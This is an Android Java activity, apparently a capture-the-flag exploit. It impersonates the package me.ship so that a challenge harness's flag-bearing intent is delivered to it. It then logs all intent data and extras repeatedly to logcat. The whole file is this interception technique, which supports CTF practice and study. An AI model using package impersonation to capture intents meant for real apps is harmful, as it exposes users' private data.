package me.ship;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.TextView;

/**
 * Impersonating me.ship.  The harness runs
 *   am start -n me.ship/.MainActivity --eu package 'shipme://cargo/?name=<FLAG>&origin=challenge'
 * so whatever app owns the package name me.ship receives the flag directly.
 * Never throw: "they can throw away your package".
 */
public class MainActivity extends Activity {

    private static final String T = "TFCCTF";
    private int tick = 0;

    private static void say(String s) {
        try {
            if (s == null) s = "null";
            for (int i = 0; i < s.length(); i += 900) {
                Log.i(T, s.substring(i, Math.min(s.length(), i + 900)));
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private void dump(String where, Intent i) {
        try {
            if (i == null) {
                say(where + " | intent=null");
                return;
            }
            say(where + " | action=" + i.getAction() + " data=" + i.getDataString());
            try {
                say(where + " | uri=" + i.toUri(Intent.URI_INTENT_SCHEME));
            } catch (Throwable t) {
                say(where + " | toUri failed " + t);
            }
            Bundle ex = i.getExtras();
            if (ex == null) {
                say(where + " | no extras");
                return;
            }
            for (String k : ex.keySet()) {
                Object v = null;
                try {
                    v = ex.get(k);
                } catch (Throwable t) {
                    v = "<" + t + ">";
                }
                say(where + " | extra[" + k + "] (" + (v == null ? "null" : v.getClass().getName())
                        + ") = " + v);
            }
        } catch (Throwable t) {
            say(where + " | dump error " + t);
        }
    }

    @Override
    protected void onCreate(Bundle b) {
        try {
            super.onCreate(b);
        } catch (Throwable t) {
            say("super.onCreate blew up " + t);
        }
        try {
            TextView tv = new TextView(this);
            tv.setText("ship.me");
            setContentView(tv);
        } catch (Throwable ignored) {
        }
        say("=== me.ship replacement alive ===");
        dump("onCreate", getIntent());
        heartbeat();
    }

    @Override
    protected void onNewIntent(Intent i) {
        try {
            super.onNewIntent(i);
            setIntent(i);
        } catch (Throwable ignored) {
        }
        dump("onNewIntent", i);
    }

    @Override
    protected void onResume() {
        try {
            super.onResume();
        } catch (Throwable ignored) {
        }
        dump("onResume", getIntent());
    }

    private void heartbeat() {
        final Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                tick++;
                dump("tick" + tick, getIntent());
                if (tick < 90) h.postDelayed(this, 2000);
            }
        }, 2000);
    }
}
